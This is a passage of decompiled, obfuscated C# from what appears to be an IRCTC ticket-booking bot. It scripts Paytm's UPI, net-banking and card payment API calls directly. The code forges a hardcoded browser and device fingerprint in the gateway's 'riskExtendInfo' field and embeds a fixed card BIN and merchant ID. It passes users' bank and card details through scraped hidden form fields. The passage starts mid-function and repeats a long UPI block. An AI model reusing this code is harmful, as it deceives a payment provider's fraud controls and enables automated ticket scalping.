                                text9 = "{\"head\":{\"version\":\"v1\",\"requestTimestamp\":" + text16 + ",\"channelId\":\"WEB\",\"txnToken\":\"" + string3 + "\",\"workFlow\":\"enhancedCashierFlow\",\"token\":\"" + string3 + "\",\"tokenType\":\"TXN_TOKEN\"},\"body\":{\"paymentMode\":\"UPI\",\"payerAccount\":\"" + text3 + "\",\"showPostFetchLoader\":false,\"requestType\":\"NATIVE\",\"authMode\":\"3D\",\"mid\":\"" + @string + "\",\"orderId\":\"" + string2 + "\",\"riskExtendInfo\":\"userAgent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36|timeZone:Asia/Calcutta|operationType:PAYMENT|refererURL:https://www.irctc.co.in/|businessFlow:STANDARD|amount:" + text23 + "|merchantType:offus|language:en-US|screenResolution:1920X1080|networkType:4g|osType:Windows|osVersion:10|platform:WEB|channelId:WEB|deviceType:Desktop|browserType:Chrome|browserVersion:106.0.0.0|\",\"paymentFlow\":\"NONE\",\"selectedPaymentModeId\":2},\"showPostFetchLoader\":false}";
                                bool_29 = true;
                                _Request(string_93, text9, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_99, ref string_98, ref webException_0);
                                string string5 = GetString(string_99, "TXN_AMOUNT");
                                string string6 = GetString(string_99, "transId");
                                string string7 = GetString(string_99, "cashierRequestId");
                                string string8 = GetString(string_99, "MERCHANT_VPA");
                                string_93 = string.Concat(new string[4] { "https://securegw.paytm.in/theia/upi/transactionStatus?MID=", @string, "&ORDER_ID=", string2 });
                                text9 = "merchantId=" + @string + "&ORDER_ID=" + string2 + "&transId=" + string6 + "&cashierRequestId=" + string7 + "&paymentMode=UPI";
                                updateTStatus_1.BeginInvoke(1, "Init. PAYTM Websafe-2/3", tCntrlName_, null, null);
                                DateTime dateTime = DateTime.Now.AddSeconds(20.0);
                                if (string_87.Contains("@axisbank"))
                                {
                                    while (true)
                                    {
                                        if (DateTime.Now > dateTime)
                                        {
                                            updateTStatus_1.BeginInvoke(1, "AXIS UPI Pay Start...", tCntrlName_, null, null);
                                            frmUPI.payStart = true;
                                            break;
                                        }
                                        if (frmUPI.payStart)
                                        {
                                            Application.DoEvents();
                                            Thread.Sleep(100);
                                            continue;
                                        }
                                        updateTStatus_1.BeginInvoke(1, "AXIS UPI Pay Start...", tCntrlName_, null, null);
                                        frmUPI.payStart = true;
                                        break;
                                    }
                                }
                                else
                                {
                                    updateTStatus_1.BeginInvoke(1, "Accept UPI Request..", tCntrlName_, null, null);
                                }
                                DateTime dateTime2 = DateTime.Now.AddSeconds(92.0);
                                do
                                {
                                    Thread.Sleep(500);
                                    if (DateTime.Now > dateTime2)
                                    {
                                        break;
                                    }
                                    _Request(string_93, text9, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_98, ref string_98, ref webException_0);
                                }
                                while (string_98.Contains("POLL_AGAIN"));
                                while (!(string_98.Contains("insufficient Balance") | string_98.Contains("Payment inComplete")))
                                {
                                    if (!string_98.Contains("POLL_AGAIN"))
                                    {
                                        updateTStatus_1.BeginInvoke(1, "Init. PAYTM Websafe-2/3", tCntrlName_, null, null);
                                        string_93 = text13 + "transactionStatus?mid=" + @string + "&ORDER_ID=" + string2;
                                        text9 = text9 + "&vpaID=" + HttpUtility.UrlEncode(text3) + "&isSelfPush=false&upiAccepted=true&upiStatusUrl=" + HttpUtility.UrlEncode(string_93) + "&upiHandleInfo=%5Bobject+Object%5D&selfPush=false&TXN_AMOUNT=" + string5 + "&STATUS_INTERVAL=5000&STATUS_TIMEOUT=300000&MERCHANT_VPA=" + string8;
                                        if (_Request(string_93, text9, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_99, ref string_98, ref webException_0))
                                        {
                                            clsMain.Lock("Success ProcessPAYTM_Getways_BHIMUPI");
                                            if (string_99.IndexOf("ENC_DATA") <= 0 && string_99.IndexOf("CHECKSUMHASH") <= 0)
                                            {
                                                string_98 = "Payment inComplete Select anOther Gateway";
                                                continue;
                                            }
                                            string_90 = string_99;
                                            string_91 = string_92;
                                            return true;
                                        }
                                        clsMain.Lock("First Hit Failed. err = " + string_98);
                                        string_91 = "Paytm Gateway not working - Payment Failed";
                                        return false;
                                    }
                                    clsMain.Lock("Upi Payment Cancel" + response);
                                    return false;
                                }
                                string text24;
                                do
                                {
                                    ((ComboBox)clsMain.control_1.Controls["cboGateway"]).Enabled = true;
                                    clsMain.Lock("Bank ID Not Exists, Choice for another payment");
                                    updateTStatus_1.BeginInvoke(1, string_98, clsMain.tCntrlName_, null, null);
                                    frmPayment frmPayment = new frmPayment();
                                    frmPayment.string_1 = string_98;
                                    frmPayment.btnSubmit.Text = "Resume";
                                    frmPayment.bool_0 = true;
                                    frmPayment.method_1(clsMain.control_0, clsMain.rectangle_0, class3_0, class3_0.BANKSAVEAS);
                                    if (frmPayment.DialogResult == DialogResult.OK)
                                    {
                                        text24 = ((ComboBox)clsMain.control_1.Controls["cboGateway"]).SelectedItem.ToString();
                                        continue;
                                    }
                                    bool_52 = true;
                                    return false;
                                }
                                while (!text24.Contains("@"));
                                ((ComboBox)clsMain.control_1.Controls["cboGateway"]).Enabled = false;
                                text3 = class3_0.dictionary_BnkData[text24];
                                array = text3.Split(new string[1] { "||" }, StringSplitOptions.None);
                                text3 = array[0];
                            }
                        }
                        string_93 = text13 + "api/v1/fetchPcfDetails?mid=" + @string + "&orderId=" + string2;
                        string_93 = text13 + "api/v1/fetchNBPaymentChannels?mid=" + @string + "&orderId=" + string2;
                        string text25 = "{\"payMethods\":[{\"payMethod\":\"NET_BANKING\",\"instId\":\"" + text + "\"}],\"mid\":\"" + @string + "\",\"orderId\":\"" + string2 + "\"},\"showLoader\":false";
                        text9 = "{\"head\":{\"version\":\"v1\",\"requestTimestamp\":" + text16 + ",\"channelId\":\"WEB\",\"txnToken\":\"" + string3 + "\",\"workFlow\":\"enhancedCashierFlow\",\"token\":\"" + string3 + "\",\"tokenType\":\"TXN_TOKEN\"},\"body\":" + text25 + "}";
                        text9 = "{\"head\":{\"version\":\"v1\",\"requestTimestamp\":" + text16 + ",\"channelId\":\"WEB\",\"txnToken\":\"" + string3 + "\",\"workFlow\":\"enhancedCashierFlow\",\"token\":\"" + string3 + "\",\"tokenType\":\"TXN_TOKEN\"},\"body\":{\"type\":\"MERCHANT\",\"mid\":\"IRCTCw862137775\",\"orderId\":\"" + string2 + "\"}}";
                        bool_29 = true;
                        _Request(string_93, text9, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_99, ref string_98, ref webException_0);
                        string_93 = text13 + "api/v1/processTransaction?mid=" + @string + "&orderId=" + string2;
                        text25 = "{\"paymentMode\":\"NET_BANKING\",\"channelCode\":\"" + text + "\",\"requestType\":\"NATIVE\",\"authMode\":\"3D\",\"mid\":\"" + @string + "\",\"orderId\":\"" + string2 + "\",\"paymentFlow\":\"NONE\",\"selectedPaymentModeId\":3}";
                        text9 = "{\"head\":{\"version\":\"v1\",\"requestTimestamp\":" + text16 + ",\"channelId\":\"WEB\",\"txnToken\":\"" + string3 + "\",\"workFlow\":\"enhancedCashierFlow\",\"token\":\"" + string3 + "\",\"tokenType\":\"TXN_TOKEN\"},\"body\":" + text25 + "}";
                        bool_29 = true;
                        _Request(string_93, text9, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_99, ref string_98, ref webException_0);
                        if (!string_99.Contains("redirectForm"))
                        {
                            clsMain.Lock("Getting payment out error= " + response);
                            return false;
                        }
                        string text26 = string_99.Substring(string_99.IndexOf("redirectForm") + 10);
                        string text27 = text26.Substring(text26.IndexOf("actionUrl") + 12);
                        text27 = text27.Substring(0, text27.IndexOf("\","));
                        string text28 = text26.Substring(text26.IndexOf("content") + 10);
                        text28 = text28.Substring(0, text28.IndexOf("}"));
                        text28 = text28.Replace("\":", "#").Replace(",", "&").Replace("\"", "");
                        response = method_168(text27, text28);
                        bool_13 = true;
                        string text29 = string_99.Substring(string_99.IndexOf("content\":{") + 10);
                        text29 = text29.Substring(0, text29.IndexOf("}"));
                        text29 = text29.Replace("\":\"", "=").Replace("\"", "");
                        string[] array2 = text29.Split(new string[1] { "," }, StringSplitOptions.None);
                        string text30 = "";
                        for (int j = 0; j < array2.Length; j++)
                        {
                            string text31 = array2[j];
                            if (text31.Contains("https") || text31.Contains("Date"))
                            {
                                string[] array3 = text31.Split(new string[1] { "=" }, StringSplitOptions.None);
                                text31 = array3[0] + "=" + WebUtility.UrlEncode(array3[1]);
                            }
                            text30 = ((j != 0) ? (text30 + "&" + text31) : text31);
                        }
                        string string9 = GetString(string_99, "callbackUrl");
                        string_99 = text30 + "|" + string9;
                    }
                    clsMain.Lock("Third Hit Inp = " + text9);
                    bool flag2 = false;
                    try
                    {
                        if (string_99.Contains("ipg-online.com"))
                        {
                            method_145(ref string_99, string_93, cookieContainer_, string_94, ref string_91);
                        }
                        switch (text6)
                        {
                            case "52":
                                flag2 = method_117(string_99, class3_0.BANKDETAILS, string_89, ref string_90, ref string_91, updateTStatus_2);
                                break;
                            case "1":
                                {
                                    CookieContainer cookieContainer_2 = null;
                                    flag2 = SbiNetBanking(string_99, class3_0.BANKSAVEAS, class3_0.BANKDETAILS, string_89, ref string_90, ref string_91, updateTStatus_2, ref cookieContainer_2);
                                    break;
                                }
                            case "36":
                                flag2 = HdfcPAYTM(string_99, class3_0.BANKDETAILS, string_89, ref string_90, ref string_91, updateTStatus_2);
                                break;
                            case "56":
                                flag2 = method_138(string_99, class3_0.BANKDETAILS, string_89, ref string_90, ref string_91, updateTStatus_2);
                                break;
                            case "41":
                                flag2 = method_107(string_99, class3_0.BANKDETAILS, string_89, ref string_90, ref string_91, updateTStatus_2);
                                break;
                            case "44":
                                flag2 = method_ICICI(string_99, class3_0.BANKDETAILS, string_89, ref string_90, ref string_91, updateTStatus_2);
                                break;
                            case "45":
                                flag2 = method_120(string_99, class3_0.BANKDETAILS, string_89, ref string_90, ref string_91, updateTStatus_2);
                                break;
                        }
                    }
                    catch
                    {
                    }
                    if (!flag2)
                    {
                        return false;
                    }
                    string_99 = string_90;
                    if (string_90.Contains("ipg-online.com"))
                    {
                        method_145(ref string_90, string_93, cookieContainer_, string_94, ref string_91);
                    }
                    if (string_90.Contains(value))
                    {
                        string_92 = string_91;
                        text9 = class3_0.Method_SerialInp(string_90, ref string_93, false);
                        if (string_93.IndexOf("https://secure.paytm.in/") != 0)
                        {
                            string_93 = "https://secure.paytm.in/oltp/HANDLER_WEB_RESP/" + text + text2 + "/USRPWD";
                        }
                        clsMain.Lock("Third Hit Inp = " + text9);
                        if (!_Request(string_93, text9, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_99, ref string_98, ref webException_0))
                        {
                            clsMain.Lock("Third Hit Failed. err = " + string_98);
                            string_91 = "Gateway Not Working - Payment Failed";
                            return false;
                        }
                    }
                    if (string_90.Contains(value2))
                    {
                        string_92 = string_91;
                        text9 = class3_0.Method_SerialInp(string_90, ref string_93, false);
                        if (string_93.IndexOf("https://securegw.paytm.in/") != 0)
                        {
                            string_93 = "https://securegw.paytm.in/instaproxy/bankresponse/" + text + "/" + text2 + "/RESP";
                        }
                        clsMain.Lock("Third Hit Inp = " + text9);
                        if (!_Request(string_93, text9, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_99, ref string_98, ref webException_0))
                        {
                            clsMain.Lock("Third Hit Failed. err = " + string_98);
                            string_91 = "Gateway Not Working - Payment Failed";
                            return false;
                        }
                        string_90 = string_99;
                        if (string_90.Contains("https://securegw.paytm.in"))
                        {
                            text9 = class3_0.Method_SerialInp(string_90, ref string_93, false);
                            clsMain.Lock("Third Hit Inp = " + text9);
                            if (!_Request(string_93, text9, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_99, ref string_98, ref webException_0))
                            {
                                clsMain.Lock("Third Hit Failed. err = " + string_98);
                                string_91 = "Gateway Not Working - Payment Failed";
                                return false;
                            }
                        }
                        string_90 = string_99;
                    }
                    clsMain.Lock("Third Output htm = " + string_99);
                    if (!string_99.Contains("https://www.irctc.co.in/eticketing/mbi"))
                    {
                        string_91 = "Error Occured while Making Payment!";
                        clsMain.Lock(string_91 + ", Check HTML");
                        return false;
                    }
                    //if (string_99.IndexOf("https://www.irctc.co.in/eticketing/BankResponse", StringComparison.CurrentCultureIgnoreCase) <= 0);
                    //{
                    //    string_91 = "Error Occured while Making Payment!";
                    //    clsMain.Lock(string_91 + ", Check HTML");
                    //    return false;
                    //}
                    clsMain.Lock("Success ProcessCC_PTM");
                    string_90 = string_99;
                    string_91 = string_92;
                    return true;
                }
                catch (Exception ex)
                {
                    frmUPI.payStart = false;
                    clsMain.method_74("ProcessCC_PTM", ex.Message);
                    return false;
                }
            }
            return method_146(string_86, string_87, string_88, string_89, ref string_90, ref string_91, updateTStatus_2);
        }

        internal bool PayTM(string string_86, string string_87, string string_88, string string_89, ref string string_90, ref string string_91, UpdateTStatus updateTStatus_2)
        {
            bool result = false;
            string_90 = "";
            string_91 = "";
            string_88 = string_88.ToUpper();
            clsMain.Lock("Enter ProcessCC_PTM.  DETAILS: ");
            if (!string_86.Contains("paytm") & !string_86.Contains("Paytm"))
            {
                string_91 = "Some thing went wrong with Credit Card Payment";
                clsMain.Lock("Html doesn't contains paytm, returning.");
                return false;
            }
            string text = string_88;
            string text2 = "";
            string string_92 = class3_0.string_69;
            string[] array = string_87.Split(new string[1] { "||" }, StringSplitOptions.None);
            string text3 = "";
            string text4 = "";
            string text5 = "";
            try
            {
                text3 = array[0].Trim();
                text4 = array[1];
                if (array.Length > 2)
                {
                    text5 = array[2];
                }
            }
            catch
            {
            }
            string string_93 = "";
            string text6 = "";
            string string_94 = "";
            string text7 = "";
            if (!string_88.Contains("_DC") && !string_88.Contains("_CC"))
            {
                if (string_88.Contains("BHIMUPI") || string_88.Contains("PHONEPE") || string_88.Contains("PAYUUPI") || string_88.Contains("PAYTMQR"))
                {
                    text2 = "UPI";
                }
                else
                {
                    bool flag = array.Length > 4;
                    text2 = "NB";
                    string text8 = text;
                    switch (Class46.smethod_0(text8))
                    {
                        case 1145574292u:
                            if (text8 == "UNION")
                            {
                                text = "UNI";
                                text6 = "28";
                            }
                            break;
                        case 1005593931u:
                            if (text8 == "SBI")
                            {
                                text = "SBI";
                                text6 = "1";
                            }
                            break;
                        case 2970694650u:
                            if (text8 == "HDFC")
                            {
                                return method_146(string_86, string_87, string_88, string_89, ref string_90, ref string_91, updateTStatus_2);
                            }
                            break;
                        case 1934763940u:
                            if (text8 == "ICICI")
                            {
                                text6 = "44";
                            }
                            break;
                        case 3504019421u:
                            if (text8 == "IDBI")
                            {
                                text6 = "52";
                            }
                            break;
                        case 3298409214u:
                            if (!(text8 == "PAYTM"))
                            {
                                break;
                            }
                            if (clsMain.isAPP)
                            {
                                return Multi_PaytmPayApp(string_86, string_87, string_88, string_89, ref string_90, ref string_91, updateTStatus_2);
                            }
                            return method_146(string_86, string_87, string_88, string_89, ref string_90, ref string_91, updateTStatus_2);
                        case 4249340199u:
                            if (text8 == "INDUSIND")
                            {
                                text = "INDS";
                                text6 = "45";
                            }
                            break;
                        case 4021309901u:
                            if (text8 == "CORP")
                            {
                                text6 = "56";
                            }
                            else if (text8 == "AIRTELMONEY")
                            {
                                text6 = "56";
                            }
                            break;
                    }
                }
                string text9 = "";
                string value = "secure.paytm.in";
                string value2 = "securegw.paytm.in";
                text9 = class3_0.Method_SerialInp(string_86, ref string_93, true);
                if (!clsMain.isAPP)
                {
                    string text10 = string_86.Substring(string_86.IndexOf("name=\"ENC_DATA\" value=\"") + 23);
                    text10 = text10.Substring(0, text10.IndexOf("\""));
                    if (text10.Contains("\n"))
                    {
                        text10 = WebUtility.UrlEncode(text10);
                        string text11 = string_86.Substring(string_86.IndexOf("name=\"MID\" value=") + 18);
                        text11 = text11.Substring(0, text11.IndexOf("\""));
                        string text12 = string_86.Substring(string_86.IndexOf("name=\"CHECKSUMHASH\" value=") + 27);
                        text12 = text12.Substring(0, text12.IndexOf("\""));
                        text12 = WebUtility.UrlEncode(text12);
                        text9 = "MID=" + text11 + "&ENC_DATA=" + text10 + "&CHECKSUMHASH=" + text12;
                    }
                }
                if (string_86.Contains("ENC_DATA") && clsMain.isAPP)
                {
                    string string_95 = GetString_(string_86, "ENC_DATA\",\"value", "\"");
                    string_95 = HttpUtility.UrlEncode(string_95);
                    string_95 = string_95.Replace("%5cn", "%0A");
                    string string_96 = GetString_(string_86, "CHECKSUMHASH\",\"value", "\"");
                    string_96 = HttpUtility.UrlEncode(string_96);
                    string string_97 = GetString_(string_86, "MID\",\"value", "\"");
                    string_93 = GetString_(string_86, "bankUrl\",\"value", "\"");
                    text9 = "MID=" + string_97 + "&CHECKSUMHASH=" + string_96 + "&ENC_DATA=" + string_95;
                }
                string text13 = string_93.Substring(0, string_93.IndexOf(".in/") + 3);
                Uri uri = new Uri(string_93);
                text13 = "https://" + uri.Host;
                for (int i = 0; i < uri.Segments.Length - 1; i++)
                {
                    text13 += uri.Segments[i];
                }
                string text14 = ((!string_93.Contains("oltp-web")) ? string_93.Substring(0, string_93.IndexOf(".in/") + 3) : "https://secure.paytm.in/oltp-web/");
                CookieContainer cookieContainer_ = new CookieContainer();
                string string_98 = "";
                string string_99 = "";
                try
                {
                    Lock("First Hit Inp = " + text9);
                    if (!clsMain.isAPP)
                    {
                        text9 = method_162(text9);
                    }
                    if (!_Request(string_93, text9, string_92, webProxy_3, ref cookieContainer_, false, true, 60000, 60000, ref string_99, ref string_98, ref webException_0))
                    {
                        clsMain.Lock("First Hit Failed. err = " + string_98);
                        string_91 = "Paytm Gateway not working - Payment Failed";
                        return false;
                    }
                    clsMain.Lock("First Output htm = " + string_99);
                    updateTStatus_1.BeginInvoke(1, "Init. PAYTM Websafe-1/3", tCntrlName_, null, null);
                    string_92 = string_93;
                    text13 = "https://securegw.paytm.in/theia/";
                    if (string.IsNullOrEmpty(string_99.Trim()) || !string_99.Contains("Paytm Secure"))
                    {
                        return result;
                    }
                    string text15 = "";
                    if (!clsMain.isAPP & !text2.Contains("UPI"))
                    {
                        text15 = string_99.Substring(string_99.IndexOf("var pushAppData=") + 17);
                        text15 = text15.Substring(0, text15.IndexOf("\""));
                    }
                    else if (!text2.Contains("UPI"))
                    {
                        text15 = string_99.Substring(string_99.IndexOf("PAYTM_CHECKOUT_URL,appData") + 28);
                        //string text15 = string_100.Substring(string_100.IndexOf("pushAppData") + 13);PAYTM_CHECKOUT_URL,appData
                        text15 = text15.Substring(0, text15.IndexOf("'"));
                    }
                    if (text2.Contains("UPI"))
                    {
                        text15 = string_99.Substring(string_99.IndexOf("var pushAppData=") + 17);
                        text15 = text15.Substring(0, text15.IndexOf("\""));
                    }
                    text15 = Class12.smethod_26(text15);
                    string @string = GetString(text15, "mid");
                    @string = GetString(text15, "mid");
                    string string2 = "";
                    if (!clsMain.isAPP & !text2.Contains("UPI"))
                    {
                        string2 = GetString(text15, "insufficientBalance\":true,\"id");
                    }
                    else if(!text2.Contains("UPI"))
                    {
                        string2 = GetString(text15, "orderId");
                    }
                    if (text2.Contains("UPI"))
                    {
                        string2 = GetString(text15, "insufficientBalance\":true,\"id");
                    }
                    string text16 = method_14();
                    string string3 = GetString(string_99, "txnToken");
                    string string4 = GetString(text15, "txnAmount");
                    string3 = GetString(text15, "txnToken");
                    if (string_88.Contains("_DC") || string_88.Contains("_CC"))
                    {
                        string_93 = text13 + "api/v1/fetchPcfDetails?mid=" + @string + "&orderId=" + string2;
                        text16 = method_14();
                        string text17 = "{\"payMethods\":[{\"payMethod\":\"DEBIT_CARD\",\"instId\":null}],\"mid\":\"" + @string + "\",\"orderId\":\"" + string2 + "\"},\"showLoader\":false";
                        if (string_88.Contains("_CC"))
                        {
                            text17 = "{\"payMethods\":[{\"payMethod\":\"CREDIT_CARD\",\"instId\":null}],\"mid\":\"" + @string + "\",\"orderId\":\"" + string2 + "\"},\"showLoader\":false";
                        }
                        text9 = "{\"head\":{\"version\":\"v1\",\"requestTimestamp\":" + text16 + ",\"channelId\":\"WEB\",\"txnToken\":\"" + string3 + "\",\"workFlow\":\"enhancedCashierFlow\",\"token\":\"" + string3 + "\",\"tokenType\":\"TXN_TOKEN\"},\"body\":" + text17 + "}";
                        bool_29 = true;
                        _Request(string_93, text9, string_92, webProxy_3, ref cookieContainer_, false, true, 60000, 60000, ref string_99, ref string_98, ref webException_0);
                        string_93 = text13 + "api/v1/fetchBinDetail?mid=" + @string + "&orderId=" + string2;
                        text16 = method_14();
                        text17 = "{\"bin\":\"526099\",\"txnType\":\"NONE\",\"isEMIDetails\":false,\"mid\":\"" + @string + "\",\"orderId\":\"" + string2 + "\"}";
                        if (string_88.Contains("_CC"))
                        {
                            text17 = "{\"bin\":\"526099\",\"txnType\":\"NONE\",\"isEMIDetails\":false,\"mid\":\"" + @string + "\",\"orderId\":\"" + string2 + "\"}";
                        }
                        text9 = "{\"head\":{\"version\":\"v1\",\"requestTimestamp\":" + text16 + ",\"channelId\":\"WEB\",\"txnToken\":\"" + string3 + "\",\"workFlow\":\"enhancedCashierFlow\",\"token\":\"" + string3 + "\",\"tokenType\":\"TXN_TOKEN\"},\"body\":" + text17 + "}";
                        bool_29 = true;
                        _Request(string_93, text9, string_92, webProxy_3, ref cookieContainer_, false, true, 60000, 60000, ref string_99, ref string_98, ref webException_0);
                        string_93 = text13 + "api/v1/processTransaction?mid=" + @string + "&orderId=" + string2;
                        text16 = method_14();
                        string text18 = "1";
                        text17 = "{\"paymentMode\":\"DEBIT_CARD\",\"authMode\":\"otp\",\"cardInfo\":\"|" + text3 + "|" + text7 + "|" + text4 + text5 + "\",\"storeInstrument\":\"1\",\"requestType\":\"NATIVE\",\"mid\":\"" + @string + "\",\"orderId\":\"" + string2 + "\",\"paymentFlow\":\"NONE\",\"selectedPaymentModeId\":" + text18 + "}";
                        if (string_88.Contains("_CC"))
                        {
                            text18 = "1";
                            text17 = "{\"paymentMode\":\"CREDIT_CARD\",\"authMode\":\"otp\",\"cardInfo\":\"|" + text3 + "|" + text7 + "|" + text4 + text5 + "\",\"storeInstrument\":\"1\",\"requestType\":\"NATIVE\",\"mid\":\"" + @string + "\",\"orderId\":\"" + string2 + "\",\"paymentFlow\":\"NONE\",\"selectedPaymentModeId\":" + text18 + "}";
                        }
                        text9 = "{\"head\":{\"version\":\"v1\",\"requestTimestamp\":" + text16 + ",\"channelId\":\"WEB\",\"txnToken\":\"" + string3 + "\",\"workFlow\":\"enhancedCashierFlow\",\"token\":\"" + string3 + "\",\"tokenType\":\"TXN_TOKEN\"},\"body\":" + text17 + "}";
                        bool_29 = true;
                        if (!_Request(string_93, text9, string_92, webProxy_3, ref cookieContainer_, false, true, 60000, 60000, ref string_99, ref string_98, ref webException_0))
                        {
                            clsMain.Lock("First Hit Failed. err = " + string_98);
                            string_91 = "Paytm Gateway not working - Payment Failed";
                            return false;
                        }
                        if (string_99.Contains("resultStatus\":\"S"))
                        {
                            string text19 = string_99.Substring(string_99.IndexOf("callbackUrl") + 14);
                            text19 = text19.Substring(0, text19.IndexOf("\""));
                            string text20 = string_99.Substring(string_99.IndexOf("content") + 10);
                            text20 = text20.Substring(0, text20.IndexOf("\"}"));
                            text20 = text20.Replace("\":", "#").Replace(",", "&");
                            text20 = text20.Replace("\\\"", "").Replace("\\", "").Replace("\"", "");
                            string_99 = method_168(text19, text20);
                        }
                    }
                    else
                    {
                        if (string_88.Contains("BHIMUPI") || string_88.Contains("PHONEPE") || string_88.Contains("PAYUUPI") || string_88.Contains("PAYTMQR"))
                        {
                            string_93 = text13 + "api/v1/fetchPcfDetails?mid=" + @string + "&orderId=" + string2;
                            string text21 = "{\"payMethods\":[{\"payMethod\":\"UPI\",\"instId\":null}],\"mid\":\"" + @string + "\",\"orderId\":\"" + string2 + "\"},\"showLoader\":false";
                            text9 = "{\"head\":{\"version\":\"v1\",\"requestTimestamp\":" + text16 + ",\"channelId\":\"WEB\",\"txnToken\":\"" + string3 + "\",\"workFlow\":\"enhancedCashierFlow\",\"token\":\"" + string3 + "\",\"tokenType\":\"TXN_TOKEN\"},\"body\":" + text21 + "}";
                            text9 = "{\"head\":{\"version\":\"v1\",\"requestTimestamp\":" + text16 + ",\"channelId\":\"WEB\",\"txnToken\":\"" + string3 + "\",\"workFlow\":\"enhancedCashierFlow\",\"token\":\"" + string3 + "\",\"tokenType\":\"TXN_TOKEN\"},\"body\":{\"payMethods\":[{\"payMethod\":\"UPI\",\"instId\":null}],\"txnAmount\":\"" + string4 + "\",\"useAmount\":false,\"mid\":\"" + @string + "\",\"orderId\":\"" + string2 + "\"},\"showLoader\":true}";
                            bool_29 = true;
                            bool_29 = true;
                            _Request(string_93, text9, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_99, ref string_98, ref webException_0);
                            string text22 = "totalTransactionAmount\":{\"currency\":\"INR\",\"value\":\"";
                            int length = text22.Length;
                            text22 = string_99.Substring(string_99.IndexOf(text22) + length);
                            string text23 = text22.Substring(0, text22.IndexOf("\""));
                            while (true)
                            {
                                text16 = method_14();
                                string_93 = text13 + "api/v1/vpa/validate?mid=" + @string + "&orderId=" + string2;
                                text21 = "{\"vpa\":\"" + text3 + "\",\"mid\":\"" + @string + "\",\"orderId\":\"" + string2 + "\"}";
                                text9 = "{\"head\":{\"version\":\"v1\",\"requestTimestamp\":" + text16 + ",\"channelId\":\"WEB\",\"txnToken\":\"" + string3 + "\",\"workFlow\":\"enhancedCashierFlow\",\"token\":\"" + string3 + "\",\"tokenType\":\"TXN_TOKEN\"},\"body\":" + text21 + "}";
                                string string_100 = string_93;
                                string string_101 = text9;
                                bool_29 = true;
                                _Request(string_100, string_101, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_99, ref string_98, ref webException_0);
                                text16 = method_14();
                                string_93 = text13 + "api/v1/processTransaction?mid=" + @string + "&orderId=" + string2;
                                text21 = string.Concat("{\"paymentMode\":\"UPI\",\"payerAccount\":\"", text3, "\",\"requestType\":\"NATIVE\",\"authMode\":\"3D\",\"mid\":\"", @string, "\",\"orderId\":\"", string2, "\",\"riskExtendInfo\":\"userAgent:Mozilla\"/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit\"/537.36 (KHTML, like Gecko) Chrome\"/90.0.4430.85 Safari\"/537.36|timeZone:Asia\"/Calcutta|operationType:PAYMENT|businessFlow:STANDARD|amount:" + text23 + "|merchantType:offus|language:en-US|screenResolution:1536X864|osType:Windows|osVersion:10|platform:WEB|channelId:WEB|deviceType:Desktop|browserType:Chrome|browserVersion:68.0.3440.106|\",\"paymentFlow\":\"NONE\",\"selectedPaymentModeId\":2},\"showPostFetchLoader\":false");
                                text9 = "{\"head\":{\"version\":\"v1\",\"requestTimestamp\":" + text16 + ",\"channelId\":\"WEB\",\"txnToken\":\"" + string3 + "\",\"workFlow\":\"enhancedCashierFlow\",\"token\":\"" + string3 + "\",\"tokenType\":\"TXN_TOKEN\"},\"body\":" + text21 + "}";
                                text9 = "{\"head\":{\"version\":\"v1\",\"requestTimestamp\":" + text16 + ",\"channelId\":\"WEB\",\"txnToken\":\"" + string3 + "\",\"workFlow\":\"enhancedCashierFlow\",\"token\":\"" + string3 + "\",\"tokenType\":\"TXN_TOKEN\"},\"body\":{\"paymentMode\":\"UPI\",\"payerAccount\":\"" + text3 + "\",\"showPostFetchLoader\":false,\"requestType\":\"NATIVE\",\"authMode\":\"3D\",\"mid\":\"" + @string + "\",\"orderId\":\"" + string2 + "\",\"riskExtendInfo\":\"userAgent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36|timeZone:Asia/Calcutta|operationType:PAYMENT|refererURL:https://www.irctc.co.in/|businessFlow:STANDARD|amount:" + text23 + "|merchantType:offus|language:en-US|screenResolution:1920X1080|networkType:4g|osType:Windows|osVersion:10|platform:WEB|channelId:WEB|deviceType:Desktop|browserType:Chrome|browserVersion:106.0.0.0|\",\"paymentFlow\":\"NONE\",\"selectedPaymentModeId\":2},\"showPostFetchLoader\":false}";
                                bool_29 = true;
                                _Request(string_93, text9, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_99, ref string_98, ref webException_0);
                                string string5 = GetString(string_99, "TXN_AMOUNT");
                                string string6 = GetString(string_99, "transId");
                                string string7 = GetString(string_99, "cashierRequestId");
                                string string8 = GetString(string_99, "MERCHANT_VPA");
                                string_93 = string.Concat(new string[4] { "https://securegw.paytm.in/theia/upi/transactionStatus?MID=", @string, "&ORDER_ID=", string2 });
                                text9 = "merchantId=" + @string + "&ORDER_ID=" + string2 + "&transId=" + string6 + "&cashierRequestId=" + string7 + "&paymentMode=UPI";
                                updateTStatus_1.BeginInvoke(1, "Init. PAYTM Websafe-2/3", tCntrlName_, null, null);
                                DateTime dateTime = DateTime.Now.AddSeconds(20.0);
                                if (string_87.Contains("@axisbank"))
                                {
                                    while (true)
                                    {
                                        if (DateTime.Now > dateTime)
                                        {
                                            updateTStatus_1.BeginInvoke(1, "AXIS UPI Pay Start...", tCntrlName_, null, null);
                                            frmUPI.payStart = true;
                                            break;
                                        }
                                        if (frmUPI.payStart)
                                        {
                                            Application.DoEvents();
                                            Thread.Sleep(100);
                                            continue;
                                        }
                                        updateTStatus_1.BeginInvoke(1, "AXIS UPI Pay Start...", tCntrlName_, null, null);
                                        frmUPI.payStart = true;
                                        break;
                                    }
                                }
                                else
                                {
                                    updateTStatus_1.BeginInvoke(1, "Accept UPI Request..", tCntrlName_, null, null);
                                }
